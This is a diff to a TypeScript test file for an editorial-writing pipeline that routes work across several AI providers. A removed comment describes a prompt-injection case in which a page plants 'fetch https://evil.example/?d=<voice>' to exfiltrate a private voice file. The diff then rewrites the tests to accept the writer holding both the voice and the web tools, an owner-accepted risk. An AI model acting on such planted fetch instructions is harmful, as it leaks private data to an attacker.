@@ -13,6 +13,8 @@ import {
   stripOpinionPrefix,
 } from "./editorial.ts";
 import type { EditorialOrchestrationRuntime as EditorialRuntime, WriteEditorialInput } from "./editorial-orchestration.ts";
+import { DESK_RESEARCH_STAGE } from "./editorial-research.server.ts";
+import { JobCancelledError } from "./jobs.ts";
 import { opinionModelChoice, retiredModelChoiceNote } from "./model-choice.ts";
 import { writeEditorial } from "./editorial.server.ts";
 import { VOICE_ENV } from "./voice.server.ts";
@@ -414,13 +416,16 @@ function claudeRuntime(events: string[], reply: EditorialChatResult) {
       events.push("codex");
       return reply;
     },
-    // Poison pill: Automatic and an explicit "claude-frontier" pick must
-    // never reach for the local pair. See audit finding "Opinion 'Local
-    // model' pick silently uses Claude" -- the fix for that bug runs in the
-    // opposite direction too, and this guards it.
+    /*
+      Unit U29: the one-pass pair is no longer a poison pill here. It is the
+      pair Automatic starts on -- DeepSeek v4.1 Flash is Opinion's first rung,
+      and it is dispatched to this one because its registry kind is "local" --
+      so a test that leaves it out would only prove the ladder never reached
+      its own head.
+    */
     async runLocalPair() {
       events.push("local");
-      throw new Error("Automatic/claude-frontier must never run the Local model pair");
+      return reply;
     },
     async runCustomPair() {
       events.push("custom");
@@ -509,7 +514,17 @@ function customRuntime(events: string[], reply: EditorialChatResult) {
 }
 
 describe("Opinion routes the exact selected cloud model", () => {
-  it("Automatic runs Codex Sol first and files without spending Claude", async () => {
+  /*
+    UNIT U29 -- AUTOMATIC STARTS ON DEEPSEEK.
+
+    The owner's decision of 2026-09-30 ("use deepseek ... deepseek is the best
+    model at the lowest price we have") made DeepSeek v4.1 Flash Opinion's
+    first rung. It is dispatched to the ONE-PASS pair rather than the Claude
+    or Codex pair because its provider has no web-tool loop
+    (`providerRunsToolPass`), which is what this pins: the id in the ladder,
+    and the transport that id actually reaches.
+  */
+  it("Automatic runs DeepSeek v4.1 Flash first and files without spending Claude", async () => {
     const orchestrateEditorial = await loadEditorialOrchestrator();
     const events: string[] = [];
     const result = await orchestrateEditorial(
@@ -518,8 +533,26 @@ describe("Opinion routes the exact selected cloud model", () => {
     );
     assert.equal(result.ok, true);
     if (!result.ok) assert.fail((result as { error: string }).error);
-    assert.equal(result.modelChoice, "codex-frontier");
-    assert.deepEqual(events, ["voice:locate", "codex", "file"]);
+    assert.equal(result.modelChoice, "deepseek-flash");
+    assert.deepEqual(events, ["voice:locate", "local", "file"]);
+  });
+
+  it("an explicit DeepSeek choice runs the one-pass pair, and never Claude or Codex", async () => {
+    const orchestrateEditorial = await loadEditorialOrchestrator();
+    const events: string[] = [];
+    const runtime = claudeRuntime(events, { ok: true, text: DELIVERED });
+    runtime.runLocalPair = async ({ input }) => {
+      assert.equal(input.modelChoice, "deepseek-flash");
+      events.push("local");
+      return { ok: true, text: DELIVERED };
+    };
+    const result = await orchestrateEditorial(
+      { ...ORCHESTRATION_INPUT, modelChoice: "deepseek-flash" },
+      runtime,
+    );
+    assert.equal(result.ok, true, result.ok ? "" : (result as { error: string }).error);
+    if (result.ok) assert.equal(result.modelChoice, "deepseek-flash");
+    assert.deepEqual(events, ["voice:locate", "local", "file"]);
   });
 
   it("an explicit Claude choice does the same", async () => {
@@ -601,7 +634,7 @@ describe("Opinion routes the exact selected cloud model", () => {
     assert.deepEqual(events, []);
   });
 
-  it("reports the Claude failure and files nothing", async () => {
+  it("reports every rung's failure and files nothing when none of them can run", async () => {
     const orchestrateEditorial = await loadEditorialOrchestrator();
     const events: string[] = [];
     const result = await orchestrateEditorial(
@@ -610,7 +643,9 @@ describe("Opinion routes the exact selected cloud model", () => {
     );
     assert.equal(result.ok, false);
     if (result.ok) assert.fail("filed on a failed pair");
+    assert.match((result as { error: string }).error, /No automatic Opinion provider/);
     assert.match((result as { error: string }).error, /Claude is unavailable/);
+    assert.deepEqual(events, ["voice:locate", "local", "codex", "claude"]);
     assert.equal(events.includes("file"), false);
   });
 
@@ -648,10 +683,23 @@ describe("Opinion routes the exact selected cloud model", () => {
     assert.equal(events.includes("file"), true);
   });
 
-  it("Automatic falls back to Claude Sonnet after a Codex quota failure", async () => {
+  /*
+    UNIT U29 -- THE ORDER, AND THE FALL-THROUGH.
+
+    Automatic walks Opinion's ladder in registry order and moves on only after
+    a technical failure: DeepSeek v4.1 Flash, then Codex Sol, then Claude
+    Sonnet. Each hop is asserted with the model the pair was actually handed,
+    so a reordered or shortened ladder fails here rather than in production.
+  */
+  it("Automatic falls through DeepSeek, then Codex, to Claude Sonnet on technical failures", async () => {
     const orchestrateEditorial = await loadEditorialOrchestrator();
     const events: string[] = [];
     const runtime = claudeRuntime(events, { ok: true, text: DELIVERED });
+    runtime.runLocalPair = async ({ input }) => {
+      assert.equal(input.modelChoice, "deepseek-flash", "Automatic starts on DeepSeek");
+      events.push("local");
+      return { ok: false, error: "429 Ollama Cloud session limit" };
+    };
     runtime.runCodexPair = async ({ input }) => {
       assert.equal(input.modelChoice, "codex-frontier");
       events.push("codex");
@@ -665,20 +713,20 @@ describe("Opinion routes the exact selected cloud model", () => {
     const result = await orchestrateEditorial(ORCHESTRATION_INPUT, runtime);
     assert.equal(result.ok, true, result.ok ? "" : (result as { error: string }).error);
     if (result.ok) assert.equal(result.modelChoice, "claude-sonnet");
-    assert.deepEqual(events, ["voice:locate", "codex", "claude", "file"]);
+    assert.deepEqual(events, ["voice:locate", "local", "codex", "claude", "file"]);
   });
 
   it("Automatic does not use another provider to bypass a refusal", async () => {
     const orchestrateEditorial = await loadEditorialOrchestrator();
     const events: string[] = [];
     const runtime = claudeRuntime(events, { ok: true, text: DELIVERED });
-    runtime.runCodexPair = async () => {
-      events.push("codex");
-      return { ok: false, error: "Codex declined this request: I cannot write this editorial." };
+    runtime.runLocalPair = async () => {
+      events.push("local");
+      return { ok: false, error: "DeepSeek declined this request: I cannot write this editorial." };
     };
     const result = await orchestrateEditorial(ORCHESTRATION_INPUT, runtime);
     assert.equal(result.ok, false);
-    assert.deepEqual(events, ["voice:locate", "codex"]);
+    assert.deepEqual(events, ["voice:locate", "local"]);
     if (!result.ok) assert.match((result as { error: string }).error, /declined this request/i);
   });
 });
@@ -732,7 +780,13 @@ describe("Opinion runs one Local model pair when explicitly picked", () => {
     assert.equal(result.ok, true, result.ok ? "" : (result as { error: string }).error);
     if (!result.ok) return;
     assert.equal(result.modelChoice, "codex-frontier");
-    assert.deepEqual(events, ["voice:locate", "local", "codex", "file"]);
+    /*
+      The ladder an explicit pick moves along is Opinion's whole ladder with
+      that pick first, which since unit U29 holds DeepSeek v4.1 Flash ahead of
+      Codex Sol. It is the second "local" here: the same one-pass pair, a
+      different registry entry (the DeepSeek rung), and it fails too.
+    */
+    assert.deepEqual(events, ["voice:locate", "local", "local", "codex", "file"]);
   });
 
   it("does not file a local-model refusal as an editorial", async () => {
@@ -772,19 +826,21 @@ describe("Opinion runs one custom API pair when explicitly picked", () => {
     Grok"), and GR-C removed the provider and its transport outright, so an
     "explicit SuperGrok choice" is not a thing any build can make:
     `opinionModelChoice` does not accept the string, and the run falls to
-    Opinion's Automatic ladder (Codex Sol first). What this test still proves
-    is the safety half -- a stored `desk_jobs.model_choice` of "grok-oauth"
-    cannot sneak into the OAuth pair through the orchestrator's custom branch;
-    it normalises to Automatic and the editor is told why.
-    `claudeRuntime`'s `runCustomPair` is the poison pill here.
+    Opinion's page default -- Automatic since unit U29b, which is also the
+    first rung that answers. What this test still proves is the safety half --
+    a stored
+    `desk_jobs.model_choice` of "grok-oauth" cannot sneak into the OAuth pair
+    through the orchestrator's custom branch; it normalises to a real choice
+    and the editor is told why. `claudeRuntime`'s `runCustomPair` is the
+    poison pill here.
   */
   it("falls a stored SuperGrok choice back to Opinion's default instead of a removed transport", async () => {
     const orchestrateEditorial = await loadEditorialOrchestrator();
     const events: string[] = [];
     assert.equal(
       opinionModelChoice("grok-oauth"),
-      "codex-frontier",
-      "a retired pick is not an Opinion choice, so it falls to Opinion's default -- Codex Sol",
+      "auto",
+      "a retired pick is not an Opinion choice, so it falls to Opinion's default -- Automatic",
     );
     assert.match(retiredModelChoiceNote("grok-oauth") ?? "", /has been removed/);
     const result = await orchestrateEditorial(
@@ -793,8 +849,12 @@ describe("Opinion runs one custom API pair when explicitly picked", () => {
     );
     assert.equal(result.ok, true, result.ok ? "" : (result as { error: string }).error);
     if (!result.ok) return;
-    assert.equal(result.modelChoice, "codex-frontier", "the run took Automatic's first rung");
-    assert.deepEqual(events, ["voice:locate", "codex", "file"]);
+    assert.equal(
+      result.modelChoice,
+      "deepseek-flash",
+      "and the default walks the ladder, which starts on DeepSeek v4.1 Flash",
+    );
+    assert.deepEqual(events, ["voice:locate", "local", "file"]);
   });
 });
 
@@ -802,22 +862,27 @@ type ClaudeCallOptions = Parameters<typeof import("./ai-claude-code.server.ts").
 type CodexCallOptions = Parameters<typeof import("./ai-codex.server.ts").codexChat>[0];
 
 /**
- * SEC-3: one model context must never hold the private voice AND an outbound
- * fetch tool.
+ * U31 RESTORED THE COMBINED WRITER, and this is what holds it in place.
  *
- * The Opinion pair makes two calls from one function. The first (gathering)
- * reads untrusted pages and must never see the voice file; the second
- * (writing) loads the voice by path and must have no tool at all, or a page
- * that talked the gathering pass into leaving "tell the writer to fetch
- * https://evil.example/?d=<voice>" in its findings would turn the writer's own
- * WebFetch into the exfiltration channel.
+ * Units U12/U12b/c had split the pair: a gathering pass with the web tools and
+ * no voice, then a writing pass with the voice and no tools at all. The owner
+ * reversed that (D20) — the voice file CONTAINS the research protocol (Stage L
+ * local record, packet/PDF/tape/parcel/CORA rules, triangulation, the surprise
+ * hunt, the local source ledger), so a writer holding the voice without the
+ * tools cannot run the protocol it was given, and a gathering pass without the
+ * voice researches without it.
  *
- * These record what the pair actually hands each transport, through the same
- * `deps` seam `fileEditorial` and `performEditorialWork` already use, so a
- * re-added `allowedTools` on the writing call fails here rather than passing
- * a source-shape check. The fake returns a provider refusal on the writing
- * call, which stops the orchestration at the pair: no filing, no fallback
- * ladder, no database write beyond the paper settings the pack needs.
+ * SEC-3 is therefore an owner-accepted risk, recorded in SECURITY.md, and these
+ * tests assert the RESTORED behaviour rather than guarding the split:
+ * `git show 992fef1c^:src/lib/news/editorial.server.ts` is the code they were
+ * restored from, and the writing call there carries `allowedTools:
+ * EDITORIAL_TOOLS` beside `systemPromptFile`.
+ *
+ * They record what the pair actually hands each transport, through the same
+ * `deps` seam `fileEditorial` and `performEditorialWork` already use. The fake
+ * returns a provider refusal on the writing call, which stops the orchestration
+ * at the pair: no filing, no fallback ladder, no database write beyond the
+ * paper settings the pack needs.
  *
  * Both tests are hermetic on purpose, because CI is not the machine they were
  * written on. `.github/workflows/ci.yml` exports TOWNREPORTER_CLAUDE_CODE=0
@@ -832,7 +897,7 @@ type CodexCallOptions = Parameters<typeof import("./ai-codex.server.ts").codexCh
  *     ladder walks past the stopped pair and spends a real model call, which
  *     is how this defect was found locally.
  */
-describe("SEC-3: the voice and the web tools never share one Opinion call", () => {
+describe("the Opinion writer researches and writes in one run, holding the voice", () => {
   const originalVoice = process.env[VOICE_ENV];
   const voicePath = join(tmpdir(), `opinion-sec3-voice-${process.pid}-${Date.now()}.txt`);
   const STOPPED = { ok: false as const, error: "EDITORIAL_REFUSAL: stopped after the pair" };
@@ -849,7 +914,7 @@ describe("SEC-3: the voice and the web tools never share one Opinion call", () =
    */
   function mustNotRun(transport: string) {
     return async (): Promise<never> => {
-      throw new Error(`the SEC-3 pair test reached the real ${transport} transport`);
+      throw new Error(`the pair test reached the real ${transport} transport`);
     };
   }
 
@@ -866,7 +931,7 @@ describe("SEC-3: the voice and the web tools never share one Opinion call", () =
     rmSync(voicePath, { force: true });
   });
 
-  it("Claude: research gets the web tools and no voice; writing gets the voice and no tools", async () => {
+  it("Claude: the writing call loads the voice by path AND may use the web tools", async () => {
     const calls: ClaudeCallOptions[] = [];
     const result = await writeEditorial(
       { ...ORCHESTRATION_INPUT, modelChoice: "claude-frontier" },
@@ -883,40 +948,37 @@ describe("SEC-3: the voice and the web tools never share one Opinion call", () =
     );
 
     assert.equal(result.ok, false, "the fake stopped the run at the writing call");
-    assert.equal(calls.length, 2, "the Claude pair is exactly two calls");
+    assert.equal(calls.length, 2, "the Claude writer is a gathering pass and a writing call");
     const [research, writing] = calls as [ClaudeCallOptions, ClaudeCallOptions];
 
-    assert.deepEqual(
-      research.allowedTools,
-      ["WebSearch", "WebFetch"],
-      "the gathering pass is the one call that may use the web",
-    );
+    assert.deepEqual(research.allowedTools, ["WebSearch", "WebFetch"]);
     assert.equal(
       research.systemPromptFile,
       undefined,
-      "the gathering pass reads untrusted pages and must not hold the private voice",
+      "the gathering pass supplies leads; the voice is not part of it",
     );
 
-    assert.equal(
-      writing.systemPromptFile,
-      voicePath,
-      "the writing pass still loads the voice by path",
-    );
+    assert.equal(writing.systemPromptFile, voicePath, "the writer loads the voice by path");
     assert.equal(writing.system, "", "the voice never travels as prompt text");
-    assert.equal(
+    assert.deepEqual(
       writing.allowedTools,
-      undefined,
-      "the writing pass holds the voice: it must not be offered a single tool",
+      ["WebSearch", "WebFetch"],
+      "the writer holds the voice AND the tools: the voice carries the research protocol",
     );
     assert.equal(
       writing.noTools,
-      true,
-      "the tool surface must be hidden (`--tools \"\"`), not merely denied",
+      undefined,
+      "the tool surface must not be hidden from the call that has to research",
     );
     assert.match(writing.user, /gathered findings, each with its URL/);
+    assert.match(
+      writing.user,
+      /Open and verify the sources yourself using the available web tools/,
+      "and the pack asks it to do what it now can",
+    );
   });
 
-  it("Codex: research asks for web search and no voice; writing asks for neither", async () => {
+  it("Codex: the writing call loads the voice by path AND asks for web search", async () => {
     const calls: CodexCallOptions[] = [];
     const result = await writeEditorial(
       { ...ORCHESTRATION_INPUT, modelChoice: "codex-frontier" },
@@ -932,22 +994,295 @@ describe("SEC-3: the voice and the web tools never share one Opinion call", () =
     );
 
     assert.equal(result.ok, false, "the fake stopped the run at the writing call");
-    assert.equal(calls.length, 2, "the Codex pair is exactly two calls");
+    assert.equal(calls.length, 2, "the Codex writer is a gathering pass and a writing call");
     const [research, writing] = calls as [CodexCallOptions, CodexCallOptions];
 
     assert.equal(research.webSearch, true, "the gathering pass searches the web");
     assert.equal(
       research.systemPromptFile,
       undefined,
-      "the gathering pass reads untrusted pages and must not hold the private voice",
+      "the gathering pass supplies leads; the voice is not part of it",
     );
 
-    assert.equal(writing.systemPromptFile, voicePath, "the writing pass still loads the voice by path");
+    assert.equal(writing.systemPromptFile, voicePath, "the writer loads the voice by path");
     assert.equal(writing.system, "", "the voice never travels as prompt text");
     assert.equal(
       writing.webSearch,
-      undefined,
-      "the writing pass holds the voice: it must not be able to search or fetch",
+      true,
+      "U12b disabled this by name; the writer's own research protocol needs it back",
     );
   });
+
+  /*
+    UNIT U29 + U30 -- THE DEEPSEEK PAIR: THE DESK RESEARCHES, THEN ONE WRITING
+    CALL WITH THE VOICE AND NO TOOLS.
+
+    DeepSeek v4.1 Flash is reached over Ollama's OpenAI-compatible HTTP face,
+    which has no WebSearch/WebFetch tool loop at all, so there is no gathering
+    pass to give the web tools to -- which is what makes SEC-3 hold by
+    construction rather than by remembering. Unit U29 stopped there and wrote
+    the piece unresearched. Unit U30 keeps the shape and adds the research: the
+    desk searches, opens and captures the pages through its own machinery, this
+    same no-tool model plans the queries and reads the captures back, and only
+    then does the voice reach a call.
+
+    UNIT U31 GAVE THAT RESEARCH THE VOICE TOO. The model planning the searches
+    and reading the records is handed the voice file as its system message, the
+    same text the writing call gets, because the voice contains the research
+    protocol the plan has to follow. That is what this test asserts: every call
+    the piece makes -- planning, reading and writing -- arrives at ONE recorder
+    on the same `grokChat` seam, and all three carry the voice.
+  */
+  it("DeepSeek: the desk researches under the voice, then writes under it", async () => {
+    const voiceText = "the operator's editorial voice, in prose. ".repeat(30);
+    type LocalCallOptions = Parameters<typeof import("./ai.ts").grokChat>[3];
+    const calls: { system: string; user: string; maxTokens: number | undefined; opts: LocalCallOptions }[] = [];
+    const stages: string[] = [];
+    const searched: string[] = [];
+    const result = await writeEditorial(
+      {
+        ...ORCHESTRATION_INPUT,
+        modelChoice: "deepseek-flash",
+        sourceText: "The editor's own notes on the levy.",
+        onStage: async (stage) => {
+          stages.push(stage);
+        },
+      },
+      {
+        grokChat: async (system, user, maxTokens, opts) => {
+          calls.push({ system, user, maxTokens, opts });
+          // Which call this is, read off its own system prompt -- which is the
+          // voice for all three of them, so the pack tells them apart instead.
+          if (system === voiceText && /THE DESK'S REQUEST\. You are the desk researcher's planner/.test(user)) {
+            return { ok: true, text: '{"queries": ["rail district levy"], "stop": true}' };
+          }
+          if (system === voiceText && /THE DESK'S REQUEST\. The desk has run the searches/.test(user)) {
+            return {
+              ok: true,
+              text: `The levy is four tenths of a cent — ${CAPTURED_URL} (from the desk's capture).`,
+            };
+          }
+          return STOPPED;
+        },
+        deskResearch: deskSeams(searched),
+        claudeCodeChat: mustNotRun("Claude"),
+        codexChat: mustNotRun("Codex"),
+      },
+    );
+
+    assert.equal(result.ok, false, "the fake stopped the run at the writing call");
+    /*
+      One planning call, one reading call, one writing call. The planner said
+      `stop` after its first round, which is the model's own stopping decision
+      and the only thing that ended it.
+    */
+    // The three packs are told apart by their own text: planning and reading
+    // both open with the desk's request, the writing pack opens with the desk's
+    // notes and ends by asking for the piece.
+    const writings = calls.filter((call) => /Write the complete editorial now/.test(call.user));
+    const research = calls.filter((call) => !writings.includes(call));
+    assert.deepEqual(
+      [calls.length, research.length, writings.length],
+      [3, 2, 1],
+      `every call the piece made: ${calls.map((c) => c.user.slice(0, 40)).join(" | ")}`,
+    );
+
+    // U31: the research calls hold the voice, exactly as the writing call does.
+    for (const call of research) {
+      assert.equal(call.system, voiceText, "every research call holds the voice file");
+    }
+    const writing = writings[0]!;
+    assert.equal(writing.system, voiceText, "and so does the writing call");
+    assert.equal(writing.opts?.choice, "deepseek-flash", "it is sent to the rung the ladder named");
+    assert.equal(
+      (writing.opts as { localModel?: unknown } | undefined)?.localModel,
+      undefined,
+      "a rung carries its endpoint in the registry; no local-model override is invented for it",
+    );
+    assert.equal(
+      (writing.opts as { noTools?: unknown } | undefined)?.noTools,
+      undefined,
+      "the writing call holds the voice: it has no tool surface to hide on this transport",
+    );
+
+    // The pack says what research ran, with the capture the appendix will cite.
+    // The exact counts are pinned by the hermetic research tests, which set
+    // the paper's official hosts themselves; here the paper config comes from
+    // the test database, so the shape is what is asserted.
+    assert.match(writing.user, /the desk searched \d+ times? and read \d+ pages?/);
+    assert.match(writing.user, /\[capture:7\]/, "the captured source carries its capture id");
+    assert.match(writing.user, new RegExp(CAPTURED_URL.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
+    assert.match(writing.user, /The editor's own notes on the levy/, "the supplied material still travels");
+    assert.doesNotMatch(writing.user, /NO GATHERING PASS RAN/, "the desk researched this piece");
+    assert.doesNotMatch(
+      writing.user,
+      /by a separate pass that searched and opened public sources/,
+      "and the pack must not claim the model's own gathering pass either",
+    );
+
+    // The run says what it is doing, in the words the job's stage list carries.
+    // The planner's query is the last thing the desk ran, and anything before
+    // it is the official-host sweep -- the protocol's local-record order, which
+    // puts the paper's own site ahead of the open web. Whether that sweep ran
+    // here depends on the test database's paper config, so only its shape is
+    // asserted; the hermetic research tests pin the ordering itself.
+    assert.equal(searched[searched.length - 1], "rail district levy", "the planner's own query ran");
+    for (const earlier of searched.slice(0, -1)) assert.match(earlier, /^site:/);
+    assert.ok(stages.includes(DESK_RESEARCH_STAGE), `stages: ${stages.join(" | ")}`);
+    assert.equal(stages[stages.length - 1], "Writing the editorial");
+  });
+
+  /*
+    The U25 Stop seam, reached from the writer. A job the editor cancelled
+    during research must end cancelled with nothing written -- not with a
+    "found nothing" piece, and not by walking the ladder onto another provider.
+  */
+  it("Stop during the desk's research ends the job cancelled and writes nothing", async () => {
+    const calls: string[] = [];
+    await assert.rejects(
+      () =>
+        writeEditorial(
+          {
+            ...ORCHESTRATION_INPUT,
+            modelChoice: "deepseek-flash",
+            completion: { requestId: 5, jobId: 6 },
+            onStage: async () => {},
+          },
+          {
+            grokChat: async () => {
+              calls.push("model");
+              return { ok: true, text: '{"queries": ["rail district levy"], "stop": true}' };
+            },
+            deskResearch: {
+              ...deskSeams([]),
+              throwIfCancelled: async () => {
+                throw new JobCancelledError();
+              },
+            },
+            claudeCodeChat: mustNotRun("Claude"),
+            codexChat: mustNotRun("Codex"),
+          },
+        ),
+      (error: unknown) => error instanceof JobCancelledError,
+    );
+    assert.deepEqual(calls, [], "no planning call, no reading call, and no writing call");
+  });
+
+  /*
+    "If research finds nothing usable, say so honestly and still write from
+    supplied material." The piece is still owed to the editor: the desk's empty
+    result is a sentence in the pack, not a failed run.
+  */
+  it("writes anyway, and says so, when the desk finds nothing usable", async () => {
+    const calls: { system: string; user: string }[] = [];
+    const result = await writeEditorial(
+      {
+        ...ORCHESTRATION_INPUT,
+        modelChoice: "deepseek-flash",
+        sourceText: "The editor's own notes on the levy.",
+        onStage: async () => {},
+      },
+      {
+        grokChat: async (system, user) => {
+          calls.push({ system, user });
+          if (/THE DESK'S REQUEST. You are the desk researcher's planner/.test(user)) {
+            return { ok: true, text: '{"queries": ["rail district levy"], "stop": true}' };
+          }
+          return STOPPED;
+        },
+        deskResearch: {
+          ...deskSeams([]),
+          search: async () => ({ hits: [], decision: "not-evaluated" }),
+        },
+        claudeCodeChat: mustNotRun("Claude"),
+        codexChat: mustNotRun("Codex"),
+      },
+    );
+
+    assert.equal(result.ok, false, "the fake stopped the run at the writing call");
+    // The plan call holds the voice too (U31), so the writing pack is told
+    // apart by its own last line rather than by its system message.
+    const writes = calls.filter((call) => /Write the complete editorial now/.test(call.user));
+    assert.equal(writes.length, 1, "the piece is still written, exactly once");
+    assert.ok(
+      !calls.some((call) => /WHAT THE DESK READ/.test(call.user)),
+      "no reading call: there was nothing captured to read",
+    );
+    const writing = writes[0]!;
+    assert.match(writing.user, /the desk searched \d+ times? and read 0 pages/);
+    assert.match(writing.user, /The desk found NOTHING USABLE for this piece/);
+    assert.match(writing.user, /The editor's own notes on the levy/, "the piece is written from what it has");
+    assert.doesNotMatch(writing.user, /NO GATHERING PASS RAN/);
+  });
+
+  /*
+    A saved connection is an OpenAI-compatible endpoint, so it has no tool loop
+    either and gets the same desk pass. Before U30 its writing pack fell through
+    to the TWO-PASS wording -- "by a separate pass that searched and opened
+    public sources before you" -- which was never true of a custom connection.
+  */
+  it("a custom connection gets the desk's research too, and an honest pack", async () => {
+    const calls: { system: string; user: string }[] = [];
+    const custom = "custom:9ce9a944-f444-4a69-8927-7c7705c07a35";
+    const result = await writeEditorial(
+      { ...ORCHESTRATION_INPUT, modelChoice: custom, onStage: async () => {} },
+      {
+        grokChat: async (system, user) => {
+          calls.push({ system, user });
+          if (/THE DESK'S REQUEST. You are the desk researcher's planner/.test(user)) {
+            return { ok: true, text: '{"queries": ["rail district levy"], "stop": true}' };
+          }
+          if (/THE DESK'S REQUEST. The desk has run the searches/.test(user)) {
+            return { ok: true, text: `Levy — ${CAPTURED_URL}` };
+          }
+          return STOPPED;
+        },
+        deskResearch: deskSeams([]),
+        claudeCodeChat: mustNotRun("Claude"),
+        codexChat: mustNotRun("Codex"),
+      },
+    );
+
+    assert.equal(result.ok, false);
+    const writes = calls.filter((call) => /Write the complete editorial now/.test(call.user));
+    assert.equal(writes.length, 1, "the desk researches for a custom connection as well");
+    assert.ok(
+      calls.some((call) => /WHAT THE DESK READ/.test(call.user)),
+      "and the captures it read reach the writing call",
+    );
+    const writing = writes[0]!;
+    assert.match(writing.user, /the desk searched \d+ times? and read \d+ pages?/);
+    assert.doesNotMatch(writing.user, /by a separate pass that searched and opened public sources/);
+  });
 });
+
+/** The page the fake desk opens, so the assertions can name one URL. */
+const CAPTURED_URL = "https://leg.colorado.gov/bills/SB21-238";
+
+/**
+ * The desk pass's outside world, faked: a search provider, one page, and a
+ * capture write and the newsroom's own record. The two research model calls are
+ * deliberately NOT faked here -- they arrive through the same `grokChat` seam the
+ * writing call uses, which is what lets the tests above assert that every call
+ * the piece makes carries the voice (unit U31).
+ */
+function deskSeams(searched: string[]): import("./editorial-research.server.ts").DeskResearchDeps {
+  return {
+    readWindow: async () => null,
+    localRecords: async () => ({ notes: "", reading: [] }),
+    search: async (query) => {
+      searched.push(query);
+      return { hits: [{ title: "SB21-238", url: CAPTURED_URL, snippet: "" }], decision: "relevant" };
+    },
+    fetch: async (url) => ({
+      ok: true,
+      status: 200,
+      outcome: "fetched",
+      title: "SB21-238",
+      text: `The bill text the desk captured from ${url}, which is long enough to be an article body.`,
+      pages: [],
+      extractionMethod: "html",
+    }),
+    capture: async () => ({ captureEventId: 7, versionId: 9 }),
+  };
+}
